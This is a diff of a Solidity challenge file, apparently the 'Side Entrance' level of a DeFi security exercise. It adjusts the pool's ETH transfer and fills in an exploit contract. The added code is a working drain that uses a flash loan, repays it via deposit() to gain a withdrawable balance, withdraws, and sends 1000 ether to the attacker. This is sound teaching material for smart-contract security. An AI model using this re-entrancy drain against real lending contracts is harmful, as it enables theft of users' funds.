@@ -1,8 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import "@solmate/utils/SafeTransferLib.sol";
 
 interface IFlashLoanEtherReceiver {
     function execute() external payable;
@@ -33,7 +32,7 @@ contract SideEntranceLenderPool {
         delete balances[msg.sender];
         emit Withdraw(msg.sender, amount);
 
-        SafeERC20.safeTransfer(IERC20(address(this)), msg.sender, amount);
+        SafeTransferLib.safeTransferETH(msg.sender, amount);
     }
 
     function flashLoan(uint256 amount) external {
@@ -54,6 +53,25 @@ contract ExploitContract {
     }
 
     // Write your exploit code below
+    /**
+     * Exploit is possible because of cross-functional re-entrancy between `flashLoan` and `deposit`.
+     * - first take the flash loan to get the control over the execution
+     * - repay by calling `deposit` that also updates balance
+     * - withdraw balance
+     */
     function exploit() public {
+        pool.flashLoan(1000 ether);
+
+        // initiate withdraw
+        pool.withdraw();
+
+        // transfer ETH to the attacker EOA
+        payable(msg.sender).transfer(1000 ether);
     }
+
+    function execute() public payable {
+        pool.deposit{value: 1000 ether}();
+    }
+
+    receive() external payable {}
 }
